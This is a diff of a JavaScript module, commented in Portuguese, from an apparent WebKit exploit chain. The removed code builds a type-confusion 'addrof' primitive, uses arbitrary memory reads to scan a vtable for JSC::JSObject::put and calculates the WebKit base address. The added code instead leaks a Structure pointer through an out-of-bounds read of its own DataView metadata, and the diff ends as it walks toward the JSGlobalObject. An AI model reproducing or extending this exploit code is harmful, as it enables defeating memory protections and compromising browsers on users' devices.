@@ -1,123 +1,58 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v106_R66_HybridLeak - Usa addrof + arb_read de baixo nível)
+// js/script3/testArrayBufferVictimCrash.mjs (v107_R67_SelfReferentialLeak - Abandona addrof)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Abandono completo das primitivas instáveis 'fakeobj' e 'arb_read_final'.
-// A nova abordagem é um HÍBRIDO:
-// 1. Usa a primitiva 'addrof' (baseada em type confusion) UMA VEZ para obter um endereço semente.
-// 2. Usa a primitiva 'arb_read' de baixo nível e robusta do 'core_exploit.mjs' para todas as leituras de memória subsequentes.
-// Esta estratégia maximiza a estabilidade para finalmente vazar a base do WebKit.
+// Abandono completo da instável primitiva 'addrof' baseada em type confusion.
+// A nova abordagem é AUTORREFERENCIAL e determinística:
+// 1. Usa a primitiva OOB para ler a metadata da própria DataView de dentro do buffer.
+// 2. A partir da metadata, vaza um ponteiro para um objeto 'Structure', obtendo o primeiro endereço absoluto.
+// 3. Usa 'arb_read' para navegar das estruturas internas do WebKit até a V-Table do JSGlobalObject.
+// 4. Escaneia a V-Table para calcular a base do WebKit de forma robusta.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    getOOBDataView,
-    arb_read // IMPORTANDO A PRIMITIVA DE LEITURA ROBUSTA
+    oob_read_absolute, // Primitiva para ler DENTRO do nosso buffer
+    arb_read           // Primitiva para ler de QUALQUER LUGAR na memória
 } from '../core_exploit.mjs';
-import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v106_R66_HybridLeak";
-
-// --- Funções de Conversão (Double <-> Int64) ---
-function doubleToInt64(double) {
-    const buf = new ArrayBuffer(8);
-    (new Float64Array(buf))[0] = double;
-    const u32 = new Uint32Array(buf);
-    return new AdvancedInt64(u32[0], u32[1]);
-}
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v107_R67_SelfReferentialLeak";
 
 // =======================================================================================
 // FUNÇÃO ORQUESTRADORA PRINCIPAL
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia Híbrida Robusta ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia Autorreferencial ---`, "test");
 
     let final_result = { success: false, message: "A cadeia de exploração falhou." };
     let leaked_webkit_base_addr = null;
 
     try {
-        // --- FASE 1: Obtenção da Primitiva OOB (necessária para o arb_read de baixo nível) ---
-        logS3("--- FASE 1: Obtendo primitiva OOB e ambiente para arb_read... ---", "subtest");
+        // --- FASE 1: Configuração do Ambiente OOB ---
+        logS3("--- FASE 1: Configurando ambiente para leitura OOB e arbitrária... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
-        logS3("Ambiente para 'arb_read' de baixo nível está pronto.", "good");
+        logS3("Ambiente OOB pronto.", "good");
 
-        // --- FASE 2: Obtenção do Endereço Semente com 'addrof' ---
-        logS3("--- FASE 2: Usando 'addrof' para obter endereço semente... ---", "subtest");
-        const confused_array = [13.37];
-        const victim_array = [{ a: 1 }];
-        const addrof = (obj) => { victim_array[0] = obj; return doubleToInt64(confused_array[0]); };
+        // --- FASE 2: Vazamento do Primeiro Endereço Absoluto (Structure*) ---
+        logS3("--- FASE 2: Vazando o primeiro endereço absoluto via autorreferência... ---", "subtest");
         
-        // O objeto leaker não é mais usado para R/W, apenas como um alvo estável para addrof.
-        const leaker_object_target = { marker: 0xDEADBEEF };
-        const leaker_addr = addrof(leaker_object_target);
-        logS3(`Endereço semente obtido do objeto alvo: ${leaker_addr.toString(true)}`, "info");
-        if (leaker_addr.low() === 0 && leaker_addr.high() === 0) {
-            throw new Error("A primitiva 'addrof' retornou um endereço NULO.");
-        }
+        // A metadata da nossa DataView está em um offset conhecido dentro do nosso buffer.
+        const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
+        const structure_ptr_offset_in_buffer = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
 
-        // --- FASE 3: Vazamento da Base do WebKit com 'arb_read' robusto ---
-        logS3("--- FASE 3: Vazando Base do WebKit com 'arb_read' de baixo nível ---", "subtest");
+        // Usamos a leitura DENTRO do buffer para vazar um ponteiro que aponta para FORA do buffer.
+        const structure_ptr = oob_read_absolute(structure_ptr_offset_in_buffer, 8);
+        logS3(`Ponteiro para o objeto 'Structure' vazado: ${structure_ptr.toString(true)}`, "leak");
+        if (structure_ptr.isZero()) throw new Error("Falha ao vazar o ponteiro da Structure. Ele é NULO.");
 
-        // 1. Ler o ponteiro da V-Table do nosso objeto alvo usando a primitiva robusta
-        const vtable_base_ptr = await arb_read(leaker_addr, 8);
-        logS3(`Ponteiro da V-Table lido com 'arb_read': ${vtable_base_ptr.toString(true)}`, "leak");
-        if (vtable_base_ptr.low() === 0 && vtable_base_ptr.high() === 0) {
-            throw new Error("Ponteiro da V-Table lido é NULO. O endereço obtido por 'addrof' pode ser inválido.");
-        }
+        // --- FASE 3: Navegação de Estruturas e Vazamento da V-Table ---
+        logS3("--- FASE 3: Navegando estruturas para encontrar a V-Table... ---", "subtest");
 
-        // 2. Escanear a V-Table em busca de um ponteiro de função conhecido
-        const function_target_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16));
-        logS3(`Alvo do escaneamento: JSC::JSObject::put (offset: ${function_target_offset.toString(true)})`, "info");
-        
-        let found_function_ptr = null;
-        const VTABLE_SCAN_LIMIT = 100;
-
-        for (let i = 0; i < VTABLE_SCAN_LIMIT; i++) {
-            const current_entry_addr = vtable_base_ptr.add(i * 8);
-            const current_function_ptr = await arb_read(current_entry_addr, 8);
-            
-            if ((current_function_ptr.low() & 0xFFFFFFF0) === (function_target_offset.low() & 0xFFFFFFF0)) {
-                logS3(`Ponteiro de função correspondente encontrado na entrada ${i} da V-Table!`, "good");
-                logS3(` -> Endereço em tempo de execução de 'put': ${current_function_ptr.toString(true)}`, "leak");
-                found_function_ptr = current_function_ptr;
-                break;
-            }
-        }
-        
-        if (!found_function_ptr) {
-            throw new Error(`Não foi possível encontrar o ponteiro da função JSC::JSObject::put na V-Table após escanear ${VTABLE_SCAN_LIMIT} entradas.`);
-        }
-
-        // 3. Calcular a base do WebKit com precisão
-        leaked_webkit_base_addr = found_function_ptr.sub(function_target_offset);
-        logS3(`>>>> ENDEREÇO BASE DO WEBKIT CALCULADO: ${leaked_webkit_base_addr.toString(true)} <<<<`, "vuln");
-        
-        if ((leaked_webkit_base_addr.low() & 0xFFF) !== 0) {
-            throw new Error("CÁLCULO FALHOU: O endereço base do WebKit calculado não está alinhado à página.");
-        } else {
-            logS3("Endereço base do WebKit funcional e alinhado à página!", "good");
-        }
-        
-        final_result = { success: true, message: "Endereço base do WebKit vazado com sucesso via estratégia híbrida." };
-
-    } catch (e) {
-        final_result.message = `Exceção na cadeia de exploração: ${e.message}\n${e.stack || ''}`;
-        logS3(final_result.message, "critical");
-    }
-
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
-    
-    return {
-        errorOccurred: final_result.success ? null : final_result.message,
-        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional para obter endereço semente." },
-        webkit_leak_result: { 
-            success: final_result.success, 
-            msg: final_result.message,
-            leaked_candidate_base_addr: leaked_webkit_base_addr, 
-        },
-        tc_probe_details: { strategy: 'Uncaged Hybrid (addrof + low-level arb_read)' }
-    };
-}
+        // 1. A partir da Structure, encontramos o JSGlobalObject (window)
+        const global_object_ptr_addr = structure_ptr.add(JSC_OFFSETS.Structure.GLOBAL_OBJECT_OFFSET);
+        const global_object_ptr = await arb_read(global_object_ptr_addr, 8);
+        logS3(`Ponteiro para o 'JSGlobalObject' encontrado: ${global_object_ptr.toString(true)}`, "info");
+        if (global_object_ptr.isZero()) throw new Error("Ponteiro para o JSGlobalObject é NULO.");
